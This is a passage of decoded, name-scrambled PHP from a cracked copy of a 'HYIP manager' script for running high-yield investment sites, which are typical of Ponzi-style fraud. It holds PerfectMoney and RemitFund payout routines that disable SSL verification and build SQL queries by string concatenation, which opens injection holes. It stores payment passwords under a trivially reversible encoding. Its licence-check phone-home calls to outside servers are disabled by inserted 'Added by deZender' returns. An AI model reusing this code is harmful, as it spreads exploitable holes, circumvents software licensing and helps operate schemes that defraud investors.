        if ($elnlcAzMsU = stristr ($elnlcypWo, '<error>') === false)
        {
          $elnlcSHqJT = true;
        }
        else
        {
          $elnlcHOiKU = strlen ($elnlcypWo) - strlen ($elnlcAzMsU);
        }

        if ($elnlcfgkgM = stristr ($elnlcypWo, '</error>') === false)
        {
          $elnlcSHqJT = true;
        }
        else
        {
          $elnlcMbwz = strlen ($elnlcypWo) - strlen ($elnlcfgkgM);
        }

        while (!$elnlcSHqJT)
        {
          $elnlcymKU = trim (substr ($elnlcypWo, $elnlcHOiKU + 7, $elnlcMbwz - 7));
          $elnlcypWo = trim (substr ($elnlcypWo, $elnlcMbwz + 8));
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = elnlcvdde ($elnlcymKU, 'text');
          $elnlcsLBI[$elnlcebOCn['elnlcIEpfS']] = elnlcvdde ($elnlcymKU, 'additional');
          if ($elnlcAzMsU = stristr ($elnlcypWo, '<error>') === false)
          {
            $elnlcSHqJT = true;
          }
          else
          {
            $elnlcHOiKU = strlen ($elnlcypWo) - strlen ($elnlcAzMsU);
          }

          if ($elnlcfgkgM = stristr ($elnlcypWo, '</error>') === false)
          {
            $elnlcSHqJT = true;
            continue;
          }
          else
          {
            $elnlcMbwz = strlen ($elnlcypWo) - strlen ($elnlcfgkgM);
            continue;
          }
        }

        $elnlcWFzO = trim (substr ($elnlcWFzO, $elnlcossS + 16));
        if ($elnlcLlml = stristr ($elnlcWFzO, '<errorresponse>') === false)
        {
          $elnlcKqgW = true;
        }
        else
        {
          $elnlcbLNAS = strlen ($elnlcWFzO) - strlen ($elnlcLlml);
        }

        if ($elnlcVIPD = stristr ($elnlcWFzO, '</errorresponse>') === false)
        {
          $elnlcKqgW = true;
          continue;
        }
        else
        {
          $elnlcossS = strlen ($elnlcWFzO) - strlen ($elnlcVIPD);
          continue;
        }
      }
    }

    return $elnlcsLBI;
  }

  function elnlcsinoz ($elnlcIDxg, $elnlcIfyfQ)
  {
    global $elnlcebOCn;
    $elnlcWTJm = strlen ($elnlcIfyfQ) + 2;
    $elnlcVBGq = strpos ($elnlcIDxg, '' . '<' . $elnlcIfyfQ . ' ');
    $elnlcpsIGi = strpos ($elnlcIDxg, '' . '<' . $elnlcIfyfQ . '>');
    if ($elnlcVBGq !== false)
    {
      $elnlcbLNAS = $elnlcVBGq;
    }

    if ($elnlcpsIGi !== false)
    {
      $elnlcbLNAS = $elnlcpsIGi;
    }

    if ($elnlcbLNAS === false)
    {
      return '';
    }

    if ($elnlcossS = strpos ($elnlcIDxg, '' . '</' . $elnlcIfyfQ . '>') === false)
    {
      return '';
    }

    $elnlcdyJI = strpos ($elnlcIDxg, '>', $elnlcbLNAS);
    $elnlcewCPD = trim (substr ($elnlcIDxg, $elnlcdyJI + 1, $elnlcossS - ($elnlcbLNAS + $elnlcWTJm)));
    return $elnlcewCPD;
  }

  function elnlcqecw ($elnlcsDyVd)
  {
    global $elnlcebOCn;
    $elnlcsLBI = array ();
    $elnlcKkLyG = elnlcsinoz ($elnlcsDyVd, 'Receipt');
    if ($elnlcKkLyG != '')
    {
      $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlcPqwj'];
      $elnlccVDBw = $elnlcKkLyG;
      $elnlcsLBI[$elnlcebOCn['elnlcjpTJ']] = elnlcsinoz ($elnlccVDBw, 'ReceiptId');
      $elnlcsLBI[$elnlcebOCn['elnlcuSeF']] = elnlcsinoz ($elnlccVDBw, 'Payer');
      $elnlcsLBI[$elnlcebOCn['elnlcFBAxi']] = elnlcsinoz ($elnlccVDBw, 'Payee');
      $elnlckNuUq = elnlcsinoz ($elnlccVDBw, 'Equivalent');
      $elnlcsLBI[$elnlcebOCn['elnlcBfAt']] = elnlcsinoz ($elnlckNuUq, 'Amount');
      $elnlcsLBI[$elnlcebOCn['elnlcjbPh']] = elnlcsinoz ($elnlckNuUq, 'CurrencyId');
    }

    $elnlcWFzO = elnlcsinoz ($elnlcsDyVd, 'ErrorResponse');
    if ($elnlcWFzO != '')
    {
      $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlcjqGL'];
      $elnlcymKU = $elnlcWFzO;
      $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = elnlcsinoz ($elnlcymKU, 'Text');
      $elnlcsLBI[$elnlcebOCn['elnlcIEpfS']] = elnlcsinoz ($elnlcymKU, 'Additional');
    }

    return $elnlcsLBI;
  }

  function elnlcspkw ($elnlcsDyVd)
  {
    global $elnlcebOCn;
    $elnlcsLBI = array ();
    $elnlcKkLyG = elnlcsinoz ($elnlcsDyVd, 'Receipt');
    if ($elnlcKkLyG != '')
    {
      $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlcPqwj'];
      $elnlccVDBw = $elnlcKkLyG;
      $elnlcsLBI[$elnlcebOCn['elnlcjpTJ']] = elnlcsinoz ($elnlccVDBw, 'ReceiptId');
      $elnlcsLBI[$elnlcebOCn['elnlcuSeF']] = elnlcsinoz ($elnlccVDBw, 'Payer');
      $elnlcsLBI[$elnlcebOCn['elnlcFBAxi']] = elnlcsinoz ($elnlccVDBw, 'Payee');
      $elnlcsLBI[$elnlcebOCn['elnlcBfAt']] = elnlcsinoz ($elnlccVDBw, 'Amount');
      $elnlcsLBI[$elnlcebOCn['elnlcjbPh']] = elnlcsinoz ($elnlccVDBw, 'CurrencyId');
    }

    $elnlcWFzO = elnlcsinoz ($elnlcsDyVd, 'Balance');
    if ($elnlcWFzO != '')
    {
      $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlcPqwj'];
      $elnlcymKU = $elnlcWFzO;
      $elnlcsLBI[$elnlcebOCn['elnlcQEpT']] = elnlcsinoz ($elnlcymKU, 'Value');
    }

    $elnlcWFzO = elnlcsinoz ($elnlcsDyVd, 'Error');
    if ($elnlcWFzO != '')
    {
      $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlcjqGL'];
      $elnlcymKU = $elnlcWFzO;
      $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = elnlcsinoz ($elnlcymKU, 'Text');
      $elnlcsLBI[$elnlcebOCn['elnlcIEpfS']] = elnlcsinoz ($elnlcymKU, 'Description');
    }

    return $elnlcsLBI;
  }

  function elnlcsjatv ($elnlcsDyVd)
  {
    global $elnlcebOCn;
    $elnlcsLBI = array ();
    $elnlcKkLyG = elnlcsinoz ($elnlcsDyVd, 'Status');
    if (elnlcsinoz ($elnlcKkLyG, 'Code') == $elnlcebOCn['elnlcnAAq'])
    {
      $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlcPqwj'];
    }
    else
    {
      $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlcjqGL'];
      $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = elnlcsinoz ($elnlcsDyVd, 'Message');
    }

    $elnlcUAUyV = elnlcsinoz ($elnlcsDyVd, 'Balance');
    if ($elnlcUAUyV != '')
    {
      $elnlcsLBI[$elnlcebOCn['elnlcQEpT']] = $elnlcUAUyV;
    }

    $elnlcKkLyG = elnlcsinoz ($elnlcsDyVd, 'Transfer');
    if ($elnlcKkLyG != '')
    {
      $elnlcsLBI[$elnlcebOCn['elnlcuSeF']] = elnlcsinoz ($elnlcKkLyG, 'Payer');
      $elnlcsLBI[$elnlcebOCn['elnlcFBAxi']] = elnlcsinoz ($elnlcKkLyG, 'Payee');
      $elnlcsLBI[$elnlcebOCn['elnlcBfAt']] = elnlcsinoz ($elnlcKkLyG, 'Amount');
      $elnlcsLBI[$elnlcebOCn['elnlcVKNx']] = elnlcsinoz ($elnlcKkLyG, 'Memo');
      $elnlcsLBI[$elnlcebOCn['elnlcjpTJ']] = elnlcsinoz ($elnlcKkLyG, 'Batch');
      $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = elnlcsinoz ($elnlcKkLyG, 'Message');
    }

    return $elnlcsLBI;
  }

  function elnlcfokfi ($elnlcmqvST, $elnlcdrkS, $elnlcgobCh, $elnlcqAwQ, $elnlcSquPB)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($elnlcroEyb[$elnlcebOCn['elnlcDBNH']] == $elnlcebOCn['elnlciyAL'])
    {
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlcyxlp']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcgobCh == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to PerfectMoney account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid PerfectMoney account', '');
    }

    list ($elnlcbKfED, $elnlcvjWVG) = elnlcnftjg ($elnlcgobCh, 18);
    if ($elnlcbKfED == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcvjWVG . '\'';
      mysql_query ($q);
      return array (0, $elnlcvjWVG);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcmqvST == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'perfectmoney_password\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcntVct = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }
      }
      else
      {
        list ($elnlcntVct, $elnlcPQkSA) = preg_split ('/\\|/', $elnlcmqvST);
        $elnlcroEyb[$elnlcebOCn['elnlcDadW']] = $elnlcPQkSA;
      }

      $elnlcujLDk = curl_init ();
      $elnlcqAwQ = rawurlencode ($elnlcqAwQ);
      curl_setopt ($elnlcujLDk, CURLOPT_URL, 'https://www.perfectmoney.com/acct/confirm.asp');
      curl_setopt ($elnlcujLDk, CURLOPT_POST, 1);
      curl_setopt ($elnlcujLDk, CURLOPT_POSTFIELDS, 'AccountID=' . rawurlencode ($elnlcroEyb[$elnlcebOCn['elnlcfbKV']]) . '&PassPhrase=' . rawurlencode ($elnlcntVct) . '&Payer_Account=' . rawurlencode ($elnlcroEyb[$elnlcebOCn['elnlcDadW']]) . '&Payee_Account=' . rawurlencode ($elnlcgobCh) . '&Amount=' . rawurlencode ($elnlcdrkS) . ('' . '&Memo=' . $elnlcqAwQ));
      curl_setopt ($elnlcujLDk, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcujLDk);
      curl_close ($elnlcujLDk);
      $elnlcDxKrG = array ();
      if (preg_match ('/<input name=\'PAYMENT_BATCH_NUM\' type=\'hidden\' value=\'(\\d+)\'>/ims', $a, $elnlcDxKrG))
      {
        return array (1, '', $elnlcDxKrG[1]);
      }
      else
      {
        if (preg_match ('/<input name=\'ERROR\' type=\'hidden\' value=\\\'(.*?)\\\'>/ims', $a, $elnlcDxKrG))
        {
          $elnlcmHqz = preg_replace ('/&lt;/i', '<', $elnlcDxKrG[1]);
          $elnlcmHqz = preg_replace ('/&gt;/i', '>', $elnlcmHqz);
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' ' . $elnlcmHqz);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcSquPB . ('' . ' ' . $elnlcmHqz), '');
        }
        else
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcSquPB . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcxfvdc ('' . $elnlcSquPB . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcSquPB . ' Curl functions are not available');
    }

  }

  function elnlckoqq ($elnlcmqvST, $elnlcdrkS, $elnlcgobCh, $elnlcqAwQ, $elnlcSquPB)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($elnlcroEyb[$elnlcebOCn['elnlcDBNH']] == $elnlcebOCn['elnlciyAL'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlcyxlp']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcgobCh == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty RemitFund account.\'';
      mysql_query ($q);
      return array (0, 'Invalid RemintFund account', '');
    }

    list ($elnlcbKfED, $elnlcvjWVG) = elnlcnftjg ($elnlcgobCh, 25);
    if ($elnlcbKfED == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcvjWVG . '\'';
      mysql_query ($q);
      return array (0, $elnlcvjWVG);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcmqvST == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'remitfund_password\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlckETx = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }

        $elnlcCGGf = $elnlcroEyb[$elnlcebOCn['elnlcBTEw']];
      }
      else
      {
        list ($elnlckETx, $elnlcCGGf) = preg_split ('/\\|/', $elnlcmqvST);
      }

      $elnlcujLDk = curl_init ();
      $elnlcCVNpo = strtoupper (md5 ('' . $elnlcCGGf . 'transferUSD' . $elnlcroEyb[$elnlcebOCn['elnlcHrMsL']] . $elnlcgobCh . $elnlcdrkS . strtoupper (md5 ($elnlckETx))));
      $elnlcIDxg = '<TransferRequest>
  <Auth>
    <ApiName>' . htmlspecialchars ($elnlcCGGf) . ('' . '</ApiName>
    <Token>' . $elnlcCVNpo . '</Token>
  </Auth>
  <Transfer>
    <TransferId></TransferId>
    <TransferType>transfer</TransferType>
    <Payer>') . htmlentities ($elnlcroEyb[$elnlcebOCn['elnlcHrMsL']], ENT_NOQUOTES) . '</Payer>
    <Payee>' . htmlentities ($elnlcgobCh, ENT_NOQUOTES) . '</Payee>
    <CurrencyId>USD</CurrencyId>
    <Amount>' . htmlentities ($elnlcdrkS, ENT_NOQUOTES) . '</Amount>
    <Memo>' . htmlentities ($elnlcqAwQ, ENT_NOQUOTES) . '</Memo>
  </Transfer>
</TransferRequest>';
      $elnlcujLDk = curl_init ();
      curl_setopt ($elnlcujLDk, CURLOPT_URL, 'https://www.remitfund.com/xml/api.php?req=' . urlencode ($elnlcIDxg));
      curl_setopt ($elnlcujLDk, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
      $elnlcdccrA = array ('User-Agent: Mozilla/5.0');
      curl_setopt ($elnlcujLDk, CURLOPT_HTTPHEADER, $elnlcdccrA);
      $a = curl_exec ($elnlcujLDk);
      curl_close ($elnlcujLDk);
      $elnlcsLBI = elnlclstq ($a);
      if ($elnlcsLBI[$elnlcebOCn['elnlccIMd']] == $elnlcebOCn['elnlcDeuNJ'])
      {
        return array (1, '', $elnlcsLBI[$elnlcebOCn['elnlcjpTJ']]);
      }
      else
      {
        if ($elnlcsLBI[$elnlcebOCn['elnlccIMd']] == $elnlcebOCn['elnlcorfdI'])
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' ' . $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcxfvdc ('' . $elnlcSquPB . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcSquPB . ' Curl functions are not available');
    }

  }

  function elnlclstq ($elnlcsDyVd)
  {
    global $elnlcebOCn;
    $elnlcsLBI = array ();
    $elnlcKkLyG = elnlcsinoz ($elnlcsDyVd, 'Response');
    if ($elnlcKkLyG != '')
    {
      $elnlccVDBw = $elnlcKkLyG;
      $elnlcsLBI[$elnlcebOCn['elnlcWHLFz']] = elnlcsinoz ($elnlccVDBw, 'Code');
      $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = elnlcsinoz ($elnlccVDBw, 'Message');
      $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = ($elnlcsLBI[$elnlcebOCn['elnlcWHLFz']] == 0 ? 'ok' : 'error');
      $elnlcsLBI[$elnlcebOCn['elnlcjpTJ']] = elnlcsinoz ($elnlccVDBw, 'TransferId');
      $elnlcsLBI[$elnlcebOCn['elnlcuSeF']] = elnlcsinoz ($elnlccVDBw, 'Payer');
      $elnlcsLBI[$elnlcebOCn['elnlcFBAxi']] = elnlcsinoz ($elnlccVDBw, 'Payee');
      $elnlcsLBI[$elnlcebOCn['elnlcBfAt']] = elnlcsinoz ($elnlccVDBw, 'Amount');
      $elnlcsLBI[$elnlcebOCn['elnlcjbPh']] = elnlcsinoz ($elnlccVDBw, 'Currency');
    }

    return $elnlcsLBI;
  }

  function elnlcteje ($elnlcdvaK, $a)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcsofoq ($elnlcdvaK);
    }

    $elnlcfRkO = base64_encode ($elnlcdvaK);
    $a = preg_split ('//', $elnlcfRkO);
    $b = preg_split ('//', md5 ($elnlcdvaK) . base64_encode ($elnlcdvaK));
    $elnlcfRkO = '';
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < sizeof ($a); ++$i)
    {
      if (strlen ($a[$i]) == 0)
      {
        continue;
      }

      $elnlcfRkO = $elnlcfRkO . $a[$i] . $b[$i];
    }

    $elnlcfRkO = str_replace ('=', '!!!^', $elnlcfRkO);
    return elnlcioif ($elnlcfRkO, $elnlcroEyb[$elnlcebOCn['elnlcKgpfS']], $elnlcebOCn['elnlcWsIB']);
  }

  function elnlclehv ($elnlcdvaK, $a)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcsofoq ($elnlcdvaK);
    }

    $elnlcdvaK = str_replace ('!!!^', '=', elnlcipfm ($elnlcdvaK, $elnlcroEyb[$elnlcebOCn['elnlcKgpfS']], 'hyip manager pro 2005 jul 27'));
    $a = preg_split ('//', $elnlcdvaK);
    $elnlcdvaK = '';
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < sizeof ($a); $i += 2)
    {
      $elnlcdvaK .= $a[$i - 1];
    }

    $elnlcfRkO = base64_decode ($elnlcdvaK);
    return $elnlcfRkO;
  }

  function elnlcsofoq ($elnlcdvaK)
  {
    global $elnlcebOCn;
    $elnlcfRkO = base64_encode ($elnlcdvaK);
    $a = preg_split ('//', $elnlcfRkO);
    $b = preg_split ('//', md5 ($elnlcdvaK) . base64_encode ($elnlcdvaK));
    $elnlcfRkO = '';
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < sizeof ($a); ++$i)
    {
      $elnlcfRkO = $elnlcfRkO . $a[$i] . $b[$i];
    }

    $elnlcfRkO = str_replace ('=', '!!!^', $elnlcfRkO);
    return $elnlcfRkO;
  }

  function elnlcffjex ($elnlcdvaK)
  {
    global $elnlcebOCn;
    $elnlcdvaK = str_replace ('!!!^', '=', $elnlcdvaK);
    $a = preg_split ('//', $elnlcdvaK);
    $elnlcdvaK = '';
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < sizeof ($a); $i += 2)
    {
      $elnlcdvaK .= $a[$i - 1];
    }

    $elnlcfRkO = base64_decode ($elnlcdvaK);
    return $elnlcfRkO;
  }

  function elnlcyhhu ()
  {
    global $elnlcebOCn;
    global $elnlctogMz;
    global $elnlcroEyb;
return;	// Added by deZender, 2010.01.30
    $elnlcCJUP = ($elnlcroEyb[$elnlcebOCn['elnlcAPEV']] == 1 ? '64.27.18.142' : $elnlcebOCn['elnlcLkypt']);
    $elnlcSOJCl = @fopen ($elnlcebOCn['elnlcPyFU'] . $elnlcCJUP . '/check.cgi?domain=' . $elnlctogMz[$elnlcebOCn['elnlcIuTL']] . '&license=' . $elnlcroEyb[$elnlcebOCn['elnlchTiBm']] . '&zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz', 'r');
    if ($elnlcSOJCl)
    {
      fclose ($elnlcSOJCl);
    }

  }

  function elnlcujzpq ()
  {
    global $elnlcebOCn;
    global $elnlctogMz;
    global $elnlcroEyb;
return;	// Added by deZender, 2010.01.30
    $l = '';
    if (function_exists ('curl_init'))
    {
      $i = $elnlcebOCn['elnlcMkRzz'];
      while ($i < 2)
      {
        $elnlcujLDk = curl_init ();
        if ($i == 1)
        {
          $elnlcCJUP = '64.27.18.142';
        }
        else
        {
          $elnlcCJUP = 'www.dnsargentina.com.ar';
        }

        $elnlczFIkf = 'http://' . $elnlcCJUP . '/check.cgi?install=1&script=3&domain=' . $elnlctogMz[$elnlcebOCn['elnlcIuTL']] . '&license=' . $elnlcroEyb[$elnlcebOCn['elnlchTiBm']] . '&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc';
        curl_setopt ($elnlcujLDk, CURLOPT_URL, $elnlczFIkf);
        curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
        $l = curl_exec ($elnlcujLDk);
        curl_close ($elnlcujLDk);
        if ($l != '')
        {
          $i = $elnlcebOCn['elnlcDWKw'];
        }

        ++$i;
      }
    }

    if ($l == '')
    {
      $elnlcSOJCl = @fopen ($elnlcebOCn['elnlcbiWJ'] . $elnlctogMz[$elnlcebOCn['elnlcIuTL']] . '&license=' . $elnlcroEyb[$elnlcebOCn['elnlchTiBm']] . '&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc', 'r');
      if ($elnlcSOJCl)
      {
        $l = fread ($elnlcSOJCl, 200000);
        fclose ($elnlcSOJCl);
      }
    }

    return $l;
  }

  function elnlchule ()
  {
    global $elnlcebOCn;
  }

  function elnlcupcg ($elnlcCsCw)
  {
    global $elnlcebOCn;
    global $elnlctogMz;
    global $elnlcroEyb;
return;	// Added by deZender, 2010.01.30
    $elnlcQBRqn = base64_encode ($elnlcCsCw);
    $elnlcujLDk = curl_init ();
    $elnlcqAwQ = rawurlencode ($elnlcqAwQ);
    if ($elnlcroEyb[$elnlcebOCn['elnlcAPEV']] == 1)
    {
      $elnlcCJUP = '64.27.18.142';
    }
    else
    {
      if ($elnlcroEyb[$elnlcebOCn['elnlcAPEV']] == 2)
      {
        $elnlcCJUP = 'www.goldcodersmail.com';
      }
      else
      {
        $elnlcCJUP = 'www.dnsargentina.com.ar';
      }
    }

    curl_setopt ($elnlcujLDk, CURLOPT_URL, 'http://' . $elnlcCJUP . $elnlcebOCn['elnlcMhjo']);
    curl_setopt ($elnlcujLDk, CURLOPT_POST, 1);
    curl_setopt ($elnlcujLDk, CURLOPT_POSTFIELDS, '' . 'in=' . $elnlcQBRqn . '&domain=' . $elnlctogMz[$elnlcebOCn['elnlcIuTL']] . '&s=p&license=' . $elnlcroEyb[$elnlcebOCn['elnlchTiBm']]);
    curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
    $l = curl_exec ($elnlcujLDk);
    curl_close ($elnlcujLDk);
    return chop ($l);
  }

  function elnlcrbvll ($elnlcCsCw, $elnlcNwtd = 0)
  {
    global $elnlcebOCn;
    global $elnlctogMz;
    global $elnlcroEyb;
return;	// Added by deZender, 2010.01.30
    if ($elnlcNwtd == 1)
    {
      $elnlcQBRqn = substr (trim ($elnlcCsCw), 0, 32);
    }
    else
    {
      $elnlcQBRqn = base64_encode (serialize ($elnlcCsCw));
    }

    $elnlcujLDk = curl_init ();
    $elnlcqAwQ = rawurlencode ($elnlcqAwQ);
    if ($elnlcroEyb[$elnlcebOCn['elnlcAPEV']] == 1)
    {
      $elnlcCJUP = '64.27.18.142';
    }
    else
    {
      if ($elnlcroEyb[$elnlcebOCn['elnlcAPEV']] == 2)
      {
        $elnlcCJUP = 'www.goldcodersmail.com';
      }
      else
      {
        $elnlcCJUP = 'www.dnsargentina.com.ar';
      }
    }

    curl_setopt ($elnlcujLDk, CURLOPT_URL, 'http://' . $elnlcCJUP . $elnlcebOCn['elnlckqOqD']);
    curl_setopt ($elnlcujLDk, CURLOPT_POST, 1);
    curl_setopt ($elnlcujLDk, CURLOPT_POSTFIELDS, '' . 'in=' . $elnlcQBRqn . '&mode=' . $elnlcNwtd . '&domain=' . $elnlctogMz[$elnlcebOCn['elnlcIuTL']] . '&s=p&license=' . $elnlcroEyb[$elnlcebOCn['elnlchTiBm']]);
    curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
    $l = curl_exec ($elnlcujLDk);
    curl_close ($elnlcujLDk);
    if ($elnlcNwtd == 1)
    {
      $elnlcsLBI = array ();
      if ($l != 'nill')
      {
        $elnlcsLBI = unserialize (base64_decode (chop ($l)));
        if (!is_array ($elnlcsLBI))
        {
          $elnlcsLBI = array ();
        }
      }

      return $elnlcsLBI;
    }
    else
    {
      return chop ($l);
    }

  }

  function elnlcfdrqh ($elnlcEuJN, $elnlcPFaFP, $elnlcnTleM, $elnlcKCwJ)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    $q = '' . 'select * from hm2_emails where id = \'' . $elnlcEuJN . '\'';
    $elnlcaJzM = mysql_query ($q);
    $elnlcMuwB = mysql_fetch_array ($elnlcaJzM);
    if (!$elnlcMuwB)
    {
      return null;
    }

    if (!$elnlcMuwB[$elnlcebOCn['elnlccIMd']])
    {
      return null;
    }

    $elnlcgVavt = $elnlcMuwB[$elnlcebOCn['elnlcHPFOO']];
    $elnlchiUK = $elnlcMuwB[$elnlcebOCn['elnlcJkLh']];
    $elnlcaSWN = $elnlcMuwB[$elnlcebOCn['elnlclhsOB']];
    foreach ($elnlcKCwJ as $k => $v)
    {
      if (is_array ($v))
      {
        $v = $v[0];
      }

      $elnlcgVavt = preg_replace ('' . '/#' . $k . '#/', $v, $elnlcgVavt);
      $elnlcaSWN = preg_replace ('' . '/#' . $k . '#/', $v, $elnlcaSWN);
      if ($elnlcMuwB[$elnlcebOCn['elnlcuacU']])
      {
        $elnlchiUK = preg_replace ('' . '/#' . $k . '#/', $v, $elnlchiUK);
        continue;
      }
    }

    $elnlcgVavt = preg_replace ('/#site_name#/', $elnlcroEyb[$elnlcebOCn['elnlcDBNH']], $elnlcgVavt);
    if ($elnlcMuwB[$elnlcebOCn['elnlcuacU']])
    {
      $elnlchiUK = preg_replace ('/#site_name#/', $elnlcroEyb[$elnlcebOCn['elnlcDBNH']], $elnlchiUK);
    }

    $elnlcaSWN = preg_replace ('/#site_name#/', $elnlcroEyb[$elnlcebOCn['elnlcDBNH']], $elnlcaSWN);
    $elnlcgVavt = preg_replace ('/#site_url#/', $elnlcroEyb[$elnlcebOCn['elnlcHMhQ']], $elnlcgVavt);
    if ($elnlcMuwB[$elnlcebOCn['elnlcuacU']])
    {
      $elnlchiUK = preg_replace ('/#site_url#/', $elnlcroEyb[$elnlcebOCn['elnlcHMhQ']], $elnlchiUK);
    }

    $elnlcaSWN = preg_replace ('/#site_url#/', $elnlcroEyb[$elnlcebOCn['elnlcHMhQ']], $elnlcaSWN);
    if ($elnlcMuwB[$elnlcebOCn['elnlcuacU']])
    {
      $elnlcoHgF = elnlcdgkif (12);
      $elnlcgVavt = elnlcbtnk ($elnlcgVavt);
      $elnlchiUK = elnlcufptk ($elnlchiUK);
      $elnlcmiJxq = '' . '--' . $elnlcoHgF . '
Content-Type: text/plain;
Content-Transfer-Encoding: 8bit

' . $elnlcgVavt . '

--' . $elnlcoHgF . '
Content-Type: text/html;
Content-transfer-encoding: quoted-printable;

' . $elnlchiUK . '

--' . $elnlcoHgF . '--';
    }
    else
    {
      $elnlcmiJxq = $elnlcgVavt;
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlcDBNH']] == $elnlcebOCn['elnlciyAL'])
    {
      $elnlcylsVl = fopen ($elnlcebOCn['elnlcqyeWl'], $elnlcebOCn['elnlczcROd']);
      fwrite ($elnlcylsVl, '' . 'TO: ' . $elnlcPFaFP . '
From: ' . $elnlcnTleM . '
Subject: ' . $elnlcaSWN . '

' . $elnlcgVavt . '

');
      fclose ($elnlcylsVl);
    }
    else
    {
      mail ($elnlcPFaFP, $elnlcaSWN, $elnlcmiJxq, '' . 'From: ' . $elnlcnTleM . '
Reply-To: ' . $elnlcnTleM . ($elnlcMuwB[$elnlcebOCn['elnlcuacU']] ? '' . '
Content-Type: multipart/alternative; boundary=' . $elnlcoHgF : ''));
    }

  }

  function elnlciqxgy ($elnlcQBRqn)
  {
    global $elnlcebOCn;
